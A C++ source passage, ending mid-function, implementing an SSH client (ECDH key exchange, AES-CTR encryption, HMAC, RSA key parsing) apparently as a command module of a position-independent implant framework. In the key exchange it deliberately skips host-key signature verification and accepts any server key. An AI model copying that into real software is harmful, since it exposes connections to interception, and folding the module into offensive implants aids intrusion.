#include <common.h>
#include <ssh_client.h>
#include <strings.h>
#include <memory.h>
#include <config.h>

#ifdef INCLUDE_CMD_SSH

using namespace stardust;
using namespace starburst;

// ─── Helpers ───────────────────────────────────────────────────────────────────

#define WS_AF_INET       2
#define WS_SOCK_STREAM   1
#define WS_IPPROTO_TCP   6
#define WS_INVALID_SOCKET (~(uintptr_t)0)

#pragma pack(push, 1)
struct ws_sockaddr_in_ssh {
    int16_t  sin_family;
    uint16_t sin_port;
    uint32_t sin_addr;
    char     sin_zero[8];
};

struct ws_addrinfo_ssh {
    int       ai_flags;
    int       ai_family;
    int       ai_socktype;
    int       ai_protocol;
    uintptr_t ai_addrlen;
    char*     ai_canonname;
    void*     ai_addr;
    ws_addrinfo_ssh* ai_next;
};

#pragma pack(pop)

struct ws_timeval_ssh {
    long tv_sec;
    long tv_usec;
};

struct ws_fd_set_ssh {
    unsigned int fd_count;
    uintptr_t    fd_array[1];
};

// SSH mpint encoding helpers
__attribute__((section(".text$B")))
static void put_u32(uint8_t* buf, uint32_t val) {
    buf[0] = (val >> 24) & 0xFF;
    buf[1] = (val >> 16) & 0xFF;
    buf[2] = (val >>  8) & 0xFF;
    buf[3] = (val >>  0) & 0xFF;
}

__attribute__((section(".text$B")))
static uint32_t get_u32(const uint8_t* buf) {
    return ((uint32_t)buf[0] << 24) | ((uint32_t)buf[1] << 16) |
           ((uint32_t)buf[2] <<  8) | ((uint32_t)buf[3]);
}

__attribute__((section(".text$B")))
static SshClientState* get_state(instance& inst) {
    return static_cast<SshClientState*>(inst.ssh_state);
}

__attribute__((section(".text$B")))
static void ssh_set_error(SshClientState* st, const char* msg) {
    if (!st) return;
    uint32_t i = 0;
    while (msg[i] && i < 254) { st->last_error[i] = msg[i]; i++; }
    st->last_error[i] = 0;
}

auto declfn starburst::ssh_last_error(instance& inst) -> const char* {
    auto st = get_state(inst);
    if (!st || st->last_error[0] == 0) return nullptr;
    return st->last_error;
}

// ─── SHA-256 convenience ───────────────────────────────────────────────────────

__attribute__((section(".text$B")))
static bool sha256(instance& inst, const uint8_t* data, uint32_t len, uint8_t out[32]) {
    auto st = get_state(inst);
    if (!st) return false;
    BCRYPT_HASH_HANDLE h = nullptr;
    if (inst.bcrypt_mod.BCryptCreateHash(st->h_sha256_plain, &h, nullptr, 0, nullptr, 0, 0) != 0)
        return false;
    inst.bcrypt_mod.BCryptHashData(h, (PUCHAR)data, len, 0);
    inst.bcrypt_mod.BCryptFinishHash(h, out, 32, 0);
    inst.bcrypt_mod.BCryptDestroyHash(h);
    return true;
}

// Multi-buffer SHA256
__attribute__((section(".text$B")))
static bool sha256_multi(instance& inst, uint8_t out[32],
    const uint8_t* d1, uint32_t l1,
    const uint8_t* d2, uint32_t l2,
    const uint8_t* d3 = nullptr, uint32_t l3 = 0,
    const uint8_t* d4 = nullptr, uint32_t l4 = 0,
    const uint8_t* d5 = nullptr, uint32_t l5 = 0,
    const uint8_t* d6 = nullptr, uint32_t l6 = 0,
    const uint8_t* d7 = nullptr, uint32_t l7 = 0)
{
    auto st = get_state(inst);
    if (!st) return false;
    BCRYPT_HASH_HANDLE h = nullptr;
    if (inst.bcrypt_mod.BCryptCreateHash(st->h_sha256_plain, &h, nullptr, 0, nullptr, 0, 0) != 0)
        return false;
    if (l1) inst.bcrypt_mod.BCryptHashData(h, (PUCHAR)d1, l1, 0);
    if (l2) inst.bcrypt_mod.BCryptHashData(h, (PUCHAR)d2, l2, 0);
    if (l3) inst.bcrypt_mod.BCryptHashData(h, (PUCHAR)d3, l3, 0);
    if (l4) inst.bcrypt_mod.BCryptHashData(h, (PUCHAR)d4, l4, 0);
    if (l5) inst.bcrypt_mod.BCryptHashData(h, (PUCHAR)d5, l5, 0);
    if (l6) inst.bcrypt_mod.BCryptHashData(h, (PUCHAR)d6, l6, 0);
    if (l7) inst.bcrypt_mod.BCryptHashData(h, (PUCHAR)d7, l7, 0);
    inst.bcrypt_mod.BCryptFinishHash(h, out, 32, 0);
    inst.bcrypt_mod.BCryptDestroyHash(h);
    return true;
}

// HMAC-SHA256
__attribute__((section(".text$B")))
static bool hmac_sha256(instance& inst, const uint8_t* key, uint32_t key_len,
    const uint8_t* data, uint32_t data_len, uint8_t out[32])
{
    BCRYPT_ALG_HANDLE h_alg = nullptr;
    wchar_t alg_name[] = { 'S','H','A','2','5','6', 0 };
    if (inst.bcrypt_mod.BCryptOpenAlgorithmProvider(&h_alg, alg_name, nullptr, 0x00000008) != 0)
        return false;

    BCRYPT_HASH_HANDLE h = nullptr;
    NTSTATUS st = inst.bcrypt_mod.BCryptCreateHash(h_alg, &h, nullptr, 0, (PUCHAR)key, key_len, 0);
    if (st != 0) {
        inst.bcrypt_mod.BCryptCloseAlgorithmProvider(h_alg, 0);
        return false;
    }
    inst.bcrypt_mod.BCryptHashData(h, (PUCHAR)data, data_len, 0);
    inst.bcrypt_mod.BCryptFinishHash(h, out, 32, 0);
    inst.bcrypt_mod.BCryptDestroyHash(h);
    inst.bcrypt_mod.BCryptCloseAlgorithmProvider(h_alg, 0);
    return true;
}

// ─── AES-CTR (manual over ECB) ────────────────────────────────────────────────

__attribute__((section(".text$B")))
static void increment_iv(uint8_t iv[16]) {
    for (int i = 15; i >= 0; i--) {
        if (++iv[i] != 0) break;
    }
}

__attribute__((section(".text$B")))
static bool aes_ctr_crypt(instance& inst, BCRYPT_KEY_HANDLE key, uint8_t iv[16],
    const uint8_t* input, uint32_t len, uint8_t* output)
{
    uint8_t counter_block[16];
    uint8_t encrypted_counter[16];
    ULONG result_len = 0;

    memory::copy(counter_block, iv, 16);

    uint32_t offset = 0;
    while (offset < len) {
        NTSTATUS st = inst.bcrypt_mod.BCryptEncrypt(
            key, counter_block, 16, nullptr,
            nullptr, 0,
            encrypted_counter, 16, &result_len, 0);
        if (st != 0) return false;

        uint32_t block_len = (len - offset) < 16 ? (len - offset) : 16;
        for (uint32_t i = 0; i < block_len; i++)
            output[offset + i] = input[offset + i] ^ encrypted_counter[i];

        increment_iv(counter_block);
        offset += block_len;
    }

    memory::copy(iv, counter_block, 16);
    return true;
}

// ─── SSH packet framing ────────────────────────────────────────────────────────

__attribute__((section(".text$B")))
static bool sock_send_all(SshClientState* st, SshSession* sess, const uint8_t* data, uint32_t len) {
    uint32_t sent = 0;
    while (sent < len) {
        int r = st->psend(sess->sock, (const char*)(data + sent), len - sent, 0);
        if (r <= 0) return false;
        sent += r;
    }
    return true;
}

__attribute__((section(".text$B")))
static bool sock_recv_all(SshClientState* st, SshSession* sess, uint8_t* buf, uint32_t len, uint32_t timeout_ms, const char* ctx = nullptr) {
    uint32_t received = 0;

    while (received < len) {
        ws_fd_set_ssh fds;
        fds.fd_count = 1;
        fds.fd_array[0] = sess->sock;
        ws_timeval_ssh tv;
        tv.tv_sec = timeout_ms / 1000;
        tv.tv_usec = (timeout_ms % 1000) * 1000;

        int sel = st->pselect(0, &fds, nullptr, nullptr, &tv);
        if (sel <= 0) {
            char emsg[128];
            uint32_t eoff = 0;
            if (ctx) { while (*ctx && eoff < 30) emsg[eoff++] = *ctx++; emsg[eoff++] = ':'; }
            const char* p = "sel=";
            while (*p && eoff < 40) emsg[eoff++] = *p++;
            char num[12]; int_to_str(num, sel, 10);
            uint32_t nlen = 0; while(num[nlen]) nlen++;
            for (uint32_t i = 0; i < nlen && eoff < 126; i++) emsg[eoff++] = num[i];
            emsg[eoff] = 0;
            ssh_set_error(st, emsg);
            return false;
        }

        int r = st->precv(sess->sock, (char*)(buf + received), len - received, 0);
        if (r <= 0) {
            int wsa_err = st->pWSAGetLastError();
            char emsg[128];
            uint32_t eoff = 0;
            if (ctx) { const char* c = ctx; while (*c && eoff < 30) emsg[eoff++] = *c++; emsg[eoff++] = ':'; }
            const char* p = "r=";
            while (*p && eoff < 40) emsg[eoff++] = *p++;
            char num[12]; int_to_str(num, r, 10);
            uint32_t nlen = 0; while(num[nlen]) nlen++;
            for (uint32_t i = 0; i < nlen && eoff < 60; i++) emsg[eoff++] = num[i];
            emsg[eoff++] = ' '; emsg[eoff++] = 'e'; emsg[eoff++] = '=';
            char num2[12]; int_to_str(num2, wsa_err, 10);
            nlen = 0; while(num2[nlen]) nlen++;
            for (uint32_t i = 0; i < nlen && eoff < 126; i++) emsg[eoff++] = num2[i];
            emsg[eoff] = 0;
            ssh_set_error(st, emsg);
            return false;
        }
        received += r;
    }
    return true;
}

__attribute__((section(".text$B")))
static bool ssh_send_packet(instance& inst, SshSession* sess, const uint8_t* payload, uint32_t payload_len) {
    auto st = get_state(inst);

    uint32_t block_size = sess->encrypted ? 16 : 8;
    uint32_t unpadded = 4 + 1 + payload_len; // packet_length field + padding_length byte + payload
    uint32_t padding = block_size - (unpadded % block_size);
    if (padding < 4) padding += block_size;

    uint32_t packet_length = 1 + payload_len + padding;
    uint32_t total_len = 4 + packet_length;

    auto pkt = static_cast<uint8_t*>(inst.heap_alloc(total_len + 32)); // +32 for MAC
    if (!pkt) return false;

    put_u32(pkt, packet_length);
    pkt[4] = (uint8_t)padding;
    memory::copy(pkt + 5, (void*)payload, payload_len);
    inst.bcrypt_mod.BCryptGenRandom(nullptr, pkt + 5 + payload_len, padding, 0x00000002);

    if (sess->encrypted) {
        // compute MAC over sequence number + plaintext packet
        uint8_t seq_buf[4];
        put_u32(seq_buf, sess->seq_cs);

        uint8_t mac_input_hdr[4];
        memory::copy(mac_input_hdr, seq_buf, 4);

        uint32_t mac_data_len = 4 + total_len;
        auto mac_data = static_cast<uint8_t*>(inst.heap_alloc(mac_data_len));
        if (!mac_data) { inst.heap_free(pkt); return false; }
        memory::copy(mac_data, seq_buf, 4);
        memory::copy(mac_data + 4, pkt, total_len);

        uint8_t mac[32];
        hmac_sha256(inst, sess->mac_key_cs, 32, mac_data, mac_data_len, mac);
        inst.heap_free(mac_data);

        // encrypt in-place
        if (!aes_ctr_crypt(inst, sess->enc_key, sess->enc_iv, pkt, total_len, pkt)) {
            inst.heap_free(pkt);
            return false;
        }

        // append MAC
        memory::copy(pkt + total_len, mac, 32);
        total_len += 32;
    }

    sess->seq_cs++;
    bool ok = sock_send_all(st, sess, pkt, total_len);
    inst.heap_free(pkt);
    return ok;
}

__attribute__((section(".text$B")))
static bool ssh_recv_packet(instance& inst, SshSession* sess, uint8_t** out_payload, uint32_t* out_len, const char* ctx = nullptr) {
    auto st = get_state(inst);
    *out_payload = nullptr;
    *out_len = 0;

    uint32_t block_size = sess->encrypted ? 16 : 8;

    // read first block to get packet_length
    uint8_t first_block[16];
    if (!sock_recv_all(st, sess, first_block, block_size, 60000, ctx)) {
        if (st->last_error[0] == 0)
            ssh_set_error(st, "recv_packet: first block read failed");
        return false;
    }

    uint8_t decrypted_first[16];
    if (sess->encrypted) {
        if (!aes_ctr_crypt(inst, sess->dec_key, sess->dec_iv, first_block, block_size, decrypted_first)) {
            ssh_set_error(st, "recv_packet: AES decrypt first block failed");
            return false;
        }
    } else {
        memory::copy(decrypted_first, first_block, block_size);
    }

    uint32_t packet_length = get_u32(decrypted_first);
    if (packet_length > SSH_MAX_PACKET_SIZE || packet_length < 2) {
        ssh_set_error(st, "recv_packet: invalid packet_length");
        return false;
    }

    uint32_t remaining = 4 + packet_length - block_size;
    uint32_t total_pkt_len = 4 + packet_length;

    auto full_pkt = static_cast<uint8_t*>(inst.heap_alloc(total_pkt_len));
    if (!full_pkt) return false;
    memory::copy(full_pkt, decrypted_first, block_size);

    if (remaining > 0) {
        if (!sock_recv_all(st, sess, full_pkt + block_size, remaining, 60000, ctx)) {
            inst.heap_free(full_pkt);
            return false;
        }
        if (sess->encrypted) {
            if (!aes_ctr_crypt(inst, sess->dec_key, sess->dec_iv,
                full_pkt + block_size, remaining, full_pkt + block_size)) {
                inst.heap_free(full_pkt);
                return false;
            }
        }
    }

    // read and verify MAC
    if (sess->encrypted) {
        uint8_t recv_mac[32];
        if (!sock_recv_all(st, sess, recv_mac, 32, 60000, ctx)) {
            inst.heap_free(full_pkt);
            return false;
        }

        uint32_t mac_data_len = 4 + total_pkt_len;
        auto mac_data = static_cast<uint8_t*>(inst.heap_alloc(mac_data_len));
        if (!mac_data) { inst.heap_free(full_pkt); return false; }

        uint8_t seq_buf[4];
        put_u32(seq_buf, sess->seq_sc);
        memory::copy(mac_data, seq_buf, 4);
        memory::copy(mac_data + 4, full_pkt, total_pkt_len);

        uint8_t expected_mac[32];
        hmac_sha256(inst, sess->mac_key_sc, 32, mac_data, mac_data_len, expected_mac);
        inst.heap_free(mac_data);

        bool mac_ok = true;
        for (int i = 0; i < 32; i++) {
            if (recv_mac[i] != expected_mac[i]) { mac_ok = false; break; }
        }
        if (!mac_ok) {
            inst.heap_free(full_pkt);
            ssh_set_error(st, "recv_packet: MAC verification failed");
            return false;
        }
    }

    sess->seq_sc++;

    uint8_t padding_len = full_pkt[4];
    uint32_t payload_len = packet_length - 1 - padding_len;

    auto payload = static_cast<uint8_t*>(inst.heap_alloc(payload_len));
    if (!payload) { inst.heap_free(full_pkt); return false; }
    memory::copy(payload, full_pkt + 5, payload_len);
    inst.heap_free(full_pkt);

    *out_payload = payload;
    *out_len = payload_len;
    return true;
}

// ─── SSH string/mpint builders ─────────────────────────────────────────────────

// Write SSH string (length-prefixed) into buffer, return bytes written
__attribute__((section(".text$B")))
static uint32_t write_ssh_string(uint8_t* buf, const uint8_t* data, uint32_t len) {
    put_u32(buf, len);
    memory::copy(buf + 4, (void*)data, len);
    return 4 + len;
}

// Write SSH mpint (big-endian integer with sign bit handling)
__attribute__((section(".text$B")))
static uint32_t write_ssh_mpint(uint8_t* buf, const uint8_t* data, uint32_t len) {
    // strip leading zeros
    while (len > 1 && data[0] == 0) { data++; len--; }
    // prepend zero byte if high bit set
    if (data[0] & 0x80) {
        put_u32(buf, len + 1);
        buf[4] = 0;
        memory::copy(buf + 5, (void*)data, len);
        return 5 + len;
    }
    put_u32(buf, len);
    memory::copy(buf + 4, (void*)data, len);
    return 4 + len;
}

// ─── KEXINIT ───────────────────────────────────────────────────────────────────

__attribute__((section(".text$B")))
static bool build_kexinit(instance& inst, uint8_t** out, uint32_t* out_len) {
    // KEX algorithms we support
    const char kex_algs[]     = "ecdh-sha2-nistp256";
    const char host_key_algs[] = "ssh-ed25519,ecdsa-sha2-nistp256,rsa-sha2-256,ssh-rsa";
    const char enc_algs[]     = "aes256-ctr,aes128-ctr";
    const char mac_algs[]     = "hmac-sha2-256";
    const char comp_algs[]    = "none";
    const char langs[]        = "";

    uint32_t buf_size = 2048;
    auto buf = static_cast<uint8_t*>(inst.heap_alloc(buf_size));
    if (!buf) return false;

    uint32_t off = 0;
    buf[off++] = SSH_MSG_KEXINIT;

    // 16 bytes cookie
    inst.bcrypt_mod.BCryptGenRandom(nullptr, buf + off, 16, 0x00000002);
    off += 16;

    // name-lists
    auto write_namelist = [&](const char* s) {
        uint32_t slen = 0;
        while (s[slen]) slen++;
        put_u32(buf + off, slen); off += 4;
        memory::copy(buf + off, (void*)s, slen); off += slen;
    };

    write_namelist(kex_algs);
    write_namelist(host_key_algs);
    write_namelist(enc_algs);  // enc client->server
    write_namelist(enc_algs);  // enc server->client
    write_namelist(mac_algs);  // mac client->server
    write_namelist(mac_algs);  // mac server->client
    write_namelist(comp_algs); // comp client->server
    write_namelist(comp_algs); // comp server->client
    write_namelist(langs);     // languages client->server
    write_namelist(langs);     // languages server->client

    buf[off++] = 0; // first_kex_packet_follows
    put_u32(buf + off, 0); off += 4; // reserved

    *out = buf;
    *out_len = off;
    return true;
}

// ─── Key Derivation ────────────────────────────────────────────────────────────

__attribute__((section(".text$B")))
static bool derive_key(instance& inst, const uint8_t* K, uint32_t K_len,
    const uint8_t H[32], char letter, const uint8_t* session_id, uint32_t sid_len,
    uint8_t out[32])
{
    // key = SHA256(K || H || letter || session_id)
    uint8_t letter_buf[1] = { (uint8_t)letter };
    return sha256_multi(inst, out,
        K, K_len,
        H, 32,
        letter_buf, 1,
        session_id, sid_len,
        nullptr, 0, nullptr, 0, nullptr, 0);
}

// ─── ECDH Key Exchange ─────────────────────────────────────────────────────────

__attribute__((section(".text$B")))
static bool do_kex_ecdh(instance& inst, SshSession* sess,
    const uint8_t* client_version, uint32_t cv_len,
    const uint8_t* server_version, uint32_t sv_len,
    const uint8_t* client_kexinit, uint32_t cki_len,
    const uint8_t* server_kexinit, uint32_t ski_len)
{
    auto st = get_state(inst);

    // Generate ECDH keypair (nistp256)
    BCRYPT_ALG_HANDLE h_ecdh = nullptr;
    wchar_t ecdh_alg[] = { 'E','C','D','H','_','P','2','5','6', 0 };
    if (inst.bcrypt_mod.BCryptOpenAlgorithmProvider(&h_ecdh, ecdh_alg, nullptr, 0) != 0) {
        ssh_set_error(st, "kex: BCryptOpenAlgorithmProvider ECDH_P256 failed");
        return false;
    }

    BCRYPT_KEY_HANDLE h_keypair = nullptr;
    if (st->pBCryptGenerateKeyPair(h_ecdh, &h_keypair, 256, 0) != 0) {
        inst.bcrypt_mod.BCryptCloseAlgorithmProvider(h_ecdh, 0);
        ssh_set_error(st, "kex: BCryptGenerateKeyPair failed");
        return false;
    }
    if (st->pBCryptFinalizeKeyPair(h_keypair, 0) != 0) {
        st->pBCryptDestroyKey(h_keypair);
        inst.bcrypt_mod.BCryptCloseAlgorithmProvider(h_ecdh, 0);
        ssh_set_error(st, "kex: BCryptFinalizeKeyPair failed");
        return false;
    }

    // Export our public key (BCRYPT_ECCPUBLIC_BLOB format)
    ULONG pub_blob_len = 0;
    st->pBCryptExportKey(h_keypair, nullptr, (LPCWSTR)L"ECCPUBLICBLOB", nullptr, 0, &pub_blob_len, 0);
    auto pub_blob = static_cast<uint8_t*>(inst.heap_alloc(pub_blob_len));
    if (!pub_blob) { ssh_set_error(st, "kex: alloc pub_blob failed"); goto fail_kex; }
    if (st->pBCryptExportKey(h_keypair, nullptr, (LPCWSTR)L"ECCPUBLICBLOB", pub_blob, pub_blob_len, &pub_blob_len, 0) != 0) {
        ssh_set_error(st, "kex: BCryptExportKey failed"); goto fail_kex; }

    {
        // BCRYPT_ECCKEY_BLOB: { magic(4), cbKey(4) } then X(cbKey), Y(cbKey)
        uint32_t cb_key = *(uint32_t*)(pub_blob + 4);
        uint8_t Q_C[65]; // uncompressed point: 04 || X || Y
        Q_C[0] = 0x04;
        memory::copy(Q_C + 1, pub_blob + 8, cb_key);          // X
        memory::copy(Q_C + 1 + cb_key, pub_blob + 8 + cb_key, cb_key); // Y

        // Send SSH_MSG_KEX_ECDH_INIT
        uint32_t init_len = 1 + 4 + 65;
        auto init_pkt = static_cast<uint8_t*>(inst.heap_alloc(init_len));
        if (!init_pkt) goto fail_kex;
        init_pkt[0] = SSH_MSG_KEX_ECDH_INIT;
        put_u32(init_pkt + 1, 65);
        memory::copy(init_pkt + 5, Q_C, 65);

        if (!ssh_send_packet(inst, sess, init_pkt, init_len)) {
            inst.heap_free(init_pkt);
            ssh_set_error(st, "kex: failed to send ECDH_INIT");
            goto fail_kex;
        }
        inst.heap_free(init_pkt);

        // Receive SSH_MSG_KEX_ECDH_REPLY
        uint8_t* reply = nullptr;
        uint32_t reply_len = 0;
        if (!ssh_recv_packet(inst, sess, &reply, &reply_len, "ecdh_reply") || !reply) {
            if (st->last_error[0] == 0)
                ssh_set_error(st, "kex: failed to recv ECDH_REPLY");
            goto fail_kex;
        }

        if (reply[0] != SSH_MSG_KEX_ECDH_REPLY) {
            inst.heap_free(reply);
            ssh_set_error(st, "kex: expected ECDH_REPLY, got wrong msg type");
            goto fail_kex;
        }

        // Parse reply: K_S (host key), Q_S (server public key), signature
        uint32_t roff = 1;

        uint32_t ks_len = get_u32(reply + roff); roff += 4;
        uint8_t* K_S = reply + roff; roff += ks_len;

        uint32_t qs_len = get_u32(reply + roff); roff += 4;
        uint8_t* Q_S = reply + roff; roff += qs_len;

        // uint32_t sig_len = get_u32(reply + roff); roff += 4;
        // signature verification skipped (we accept any host key)

        if (qs_len != 65 || Q_S[0] != 0x04) {
            inst.heap_free(reply);
            ssh_set_error(st, "kex: server Q_S not uncompressed P256 point");
            goto fail_kex;
        }

        // Import server's public key
        uint32_t import_blob_len = 8 + 64; // header + X + Y
        auto import_blob = static_cast<uint8_t*>(inst.heap_alloc(import_blob_len));
        if (!import_blob) { inst.heap_free(reply); goto fail_kex; }

        // BCRYPT_ECCKEY_BLOB header for P256 public key
        // Magic = BCRYPT_ECDH_PUBLIC_P256_MAGIC = 0x314B4345
        *(uint32_t*)(import_blob + 0) = 0x314B4345;
        *(uint32_t*)(import_blob + 4) = 32; // cbKey
        memory::copy(import_blob + 8, Q_S + 1, 32);      // X
        memory::copy(import_blob + 8 + 32, Q_S + 33, 32); // Y

        BCRYPT_KEY_HANDLE h_server_key = nullptr;
        if (st->pBCryptImportKeyPair(h_ecdh, nullptr, (LPCWSTR)L"ECCPUBLICBLOB",
            &h_server_key, import_blob, import_blob_len, 0) != 0) {
            inst.heap_free(import_blob);
            inst.heap_free(reply);
            ssh_set_error(st, "kex: BCryptImportKeyPair server key failed");
            goto fail_kex;
        }
        inst.heap_free(import_blob);

        // Compute shared secret
        BCRYPT_SECRET_HANDLE h_secret = nullptr;
        if (st->pBCryptSecretAgreement(h_keypair, h_server_key, &h_secret, 0) != 0) {
            st->pBCryptDestroyKey(h_server_key);
            inst.heap_free(reply);
            ssh_set_error(st, "kex: BCryptSecretAgreement failed");
            goto fail_kex;
        }

        // Derive raw shared secret (X coordinate)
        wchar_t kdf_raw[] = { 'T','R','U','N','C','A','T','E', 0 };
        uint8_t shared_secret[32];
        ULONG ss_len = 0;
        if (st->pBCryptDeriveKey(h_secret, kdf_raw, nullptr, shared_secret, 32, &ss_len, 0) != 0) {
            st->pBCryptDestroySecret(h_secret);
            st->pBCryptDestroyKey(h_server_key);
            inst.heap_free(reply);
            ssh_set_error(st, "kex: BCryptDeriveKey (TRUNCATE) failed");
            goto fail_kex;
        }
        st->pBCryptDestroySecret(h_secret);
        st->pBCryptDestroyKey(h_server_key);

        // BCryptDeriveKey("TRUNCATE") may return little-endian; SSH needs big-endian
        for (uint32_t i = 0; i < 16; i++) {
            uint8_t tmp = shared_secret[i];
            shared_secret[i] = shared_secret[31 - i];
            shared_secret[31 - i] = tmp;
        }

        // Encode K as SSH mpint
        uint8_t K_mpint[64];
        uint32_t K_mpint_len = write_ssh_mpint(K_mpint, shared_secret, 32);

        // Compute exchange hash H = SHA256(V_C || V_S || I_C || I_S || K_S || Q_C || Q_S || K)
        // All strings are SSH-encoded (length-prefixed)
        uint32_t hash_buf_size = 4 + cv_len + 4 + sv_len + 4 + cki_len + 4 + ski_len +
                                 4 + ks_len + 4 + 65 + 4 + qs_len + K_mpint_len;
        auto hash_buf = static_cast<uint8_t*>(inst.heap_alloc(hash_buf_size));
        if (!hash_buf) { inst.heap_free(reply); goto fail_kex; }

        uint32_t hoff = 0;
        hoff += write_ssh_string(hash_buf + hoff, client_version, cv_len);
        hoff += write_ssh_string(hash_buf + hoff, server_version, sv_len);
        hoff += write_ssh_string(hash_buf + hoff, client_kexinit, cki_len);
        hoff += write_ssh_string(hash_buf + hoff, server_kexinit, ski_len);
        hoff += write_ssh_string(hash_buf + hoff, K_S, ks_len);
        hoff += write_ssh_string(hash_buf + hoff, Q_C, 65);
        hoff += write_ssh_string(hash_buf + hoff, Q_S, qs_len);
        memory::copy(hash_buf + hoff, K_mpint, K_mpint_len); hoff += K_mpint_len;

        uint8_t H[32];
        sha256(inst, hash_buf, hoff, H);
        inst.heap_free(hash_buf);
        inst.heap_free(reply);

        // First KEX: session_id = H
        if (sess->session_id_len == 0) {
            memory::copy(sess->session_id, H, 32);
            sess->session_id_len = 32;
        }

        // Send SSH_MSG_NEWKEYS
        uint8_t newkeys[1] = { SSH_MSG_NEWKEYS };
        if (!ssh_send_packet(inst, sess, newkeys, 1)) {
            ssh_set_error(st, "kex: failed to send NEWKEYS"); goto fail_kex; }

        // Receive SSH_MSG_NEWKEYS
        uint8_t* nk_reply = nullptr;
        uint32_t nk_len = 0;
        if (!ssh_recv_packet(inst, sess, &nk_reply, &nk_len, "newkeys") || !nk_reply) {
            if (st->last_error[0] == 0)
                ssh_set_error(st, "kex: failed to recv NEWKEYS");
            goto fail_kex; }
        if (nk_reply[0] != SSH_MSG_NEWKEYS) {
            inst.heap_free(nk_reply);
            ssh_set_error(st, "kex: expected NEWKEYS, got wrong msg"); goto fail_kex;
        }
        inst.heap_free(nk_reply);

        // Derive session keys
        uint8_t iv_cs[32], iv_sc[32], key_cs[32], key_sc[32];
        derive_key(inst, K_mpint, K_mpint_len, H, 'A', sess->session_id, sess->session_id_len, iv_cs);
        derive_key(inst, K_mpint, K_mpint_len, H, 'B', sess->session_id, sess->session_id_len, iv_sc);
        derive_key(inst, K_mpint, K_mpint_len, H, 'C', sess->session_id, sess->session_id_len, key_cs);
        derive_key(inst, K_mpint, K_mpint_len, H, 'D', sess->session_id, sess->session_id_len, key_sc);
        derive_key(inst, K_mpint, K_mpint_len, H, 'E', sess->session_id, sess->session_id_len, sess->mac_key_cs);
        derive_key(inst, K_mpint, K_mpint_len, H, 'F', sess->session_id, sess->session_id_len, sess->mac_key_sc);

        memory::copy(sess->enc_iv, iv_cs, 16);
        memory::copy(sess->dec_iv, iv_sc, 16);

        // Create AES-256 ECB keys for CTR mode
        BCRYPT_ALG_HANDLE h_aes = nullptr;
        wchar_t aes_alg[] = { 'A','E','S', 0 };
        wchar_t chain_ecb[] = { 'C','h','a','i','n','i','n','g','M','o','d','e','E','C','B', 0 };

        if (inst.bcrypt_mod.BCryptOpenAlgorithmProvider(&h_aes, aes_alg, nullptr, 0) != 0) {
            ssh_set_error(st, "kex: BCryptOpenAlgorithmProvider AES failed"); goto fail_kex; }
        inst.bcrypt_mod.BCryptSetProperty(h_aes, (LPCWSTR)L"ChainingMode",
            (PUCHAR)chain_ecb, sizeof(chain_ecb), 0);

        // check which key size the negotiation selected (we prefer aes256-ctr → 32-byte keys)
        if (inst.bcrypt_mod.BCryptGenerateSymmetricKey(h_aes, &sess->enc_key, nullptr, 0, key_cs, 32, 0) != 0) {
            inst.bcrypt_mod.BCryptCloseAlgorithmProvider(h_aes, 0);
            ssh_set_error(st, "kex: BCryptGenerateSymmetricKey enc failed"); goto fail_kex;
        }
        if (inst.bcrypt_mod.BCryptGenerateSymmetricKey(h_aes, &sess->dec_key, nullptr, 0, key_sc, 32, 0) != 0) {
            inst.bcrypt_mod.BCryptCloseAlgorithmProvider(h_aes, 0);
            ssh_set_error(st, "kex: BCryptGenerateSymmetricKey dec failed"); goto fail_kex;
        }
        sess->h_aes = h_aes;

        sess->encrypted = true;
    }

    inst.heap_free(pub_blob);
    st->pBCryptDestroyKey(h_keypair);
    inst.bcrypt_mod.BCryptCloseAlgorithmProvider(h_ecdh, 0);
    return true;

fail_kex:
    if (pub_blob) inst.heap_free(pub_blob);
    st->pBCryptDestroyKey(h_keypair);
    inst.bcrypt_mod.BCryptCloseAlgorithmProvider(h_ecdh, 0);
    return false;
}

// ─── Base64 decoder ───────────────────────────────────────────────────────────

__attribute__((section(".text$B")))
static int b64_val(uint8_t c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

__attribute__((section(".text$B")))
static uint32_t base64_decode(const uint8_t* src, uint32_t src_len,
    uint8_t* dst, uint32_t dst_cap)
{
    uint32_t di = 0;
    uint32_t buf = 0, bits = 0;
    for (uint32_t i = 0; i < src_len && di < dst_cap; i++) {
        if (src[i] == '\r' || src[i] == '\n' || src[i] == ' ') continue;
        if (src[i] == '=') break;
        int v = b64_val(src[i]);
        if (v < 0) continue;
        buf = (buf << 6) | v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            dst[di++] = (uint8_t)(buf >> bits);
        }
    }
    return di;
}

// ─── ASN.1 DER helpers ───────────────────────────────────────────────────────

__attribute__((section(".text$B")))
static bool asn1_read_tag_len(const uint8_t* data, uint32_t len, uint32_t* pos,
    uint8_t* out_tag, uint32_t* out_len)
{
    if (*pos >= len) return false;
    *out_tag = data[(*pos)++];
    if (*pos >= len) return false;
    uint8_t b = data[(*pos)++];
    if (b < 0x80) {
        *out_len = b;
    } else {
        uint32_t num_bytes = b & 0x7F;
        if (num_bytes > 4 || *pos + num_bytes > len) return false;
        *out_len = 0;
        for (uint32_t i = 0; i < num_bytes; i++)
            *out_len = (*out_len << 8) | data[(*pos)++];
    }
    return true;
}

// ─── PEM RSA key parsing ──────────────────────────────────────────────────────

struct RsaKeyComponents {
    const uint8_t* n;   uint32_t n_len;
    const uint8_t* e;   uint32_t e_len;
    const uint8_t* d;   uint32_t d_len;
    const uint8_t* p;   uint32_t p_len;
    const uint8_t* q;   uint32_t q_len;
};

// Parse PKCS#1 DER: SEQUENCE { version, n, e, d, p, q, ... }
__attribute__((section(".text$B")))
static bool parse_pkcs1_der(const uint8_t* der, uint32_t der_len, RsaKeyComponents* out) {
    uint32_t pos = 0;
    uint8_t tag; uint32_t tlen;

    // outer SEQUENCE
    if (!asn1_read_tag_len(der, der_len, &pos, &tag, &tlen)) return false;
    if (tag != 0x30) return false;

    // version INTEGER (skip)
    if (!asn1_read_tag_len(der, der_len, &pos, &tag, &tlen)) return false;
    if (tag != 0x02) return false;
    pos += tlen;

    // n
    if (!asn1_read_tag_len(der, der_len, &pos, &tag, &tlen)) return false;
    if (tag != 0x02) return false;
    out->n = der + pos; out->n_len = tlen;
    // strip leading zero byte used for sign
    if (out->n_len > 0 && out->n[0] == 0x00) { out->n++; out->n_len--; }
    pos += tlen;

    // e
